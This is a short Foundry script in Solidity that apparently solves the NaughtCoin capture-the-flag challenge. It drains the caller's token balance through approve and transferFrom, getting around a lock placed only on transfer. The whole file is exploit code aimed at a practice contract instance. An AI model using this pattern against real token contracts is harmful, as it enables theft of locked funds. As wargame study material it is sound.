// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/15_NaughtCoin.sol";

contract AttackerNaughtCoinScript is Script {
    NaughtCoin naughtCoin = NaughtCoin(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        uint256 bal = naughtCoin.balanceOf(msg.sender);

        console.log("Current balance :", bal);
        naughtCoin.approve(msg.sender, bal);
        naughtCoin.transferFrom(msg.sender, address(this), bal);
        console.log("New balance :", naughtCoin.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
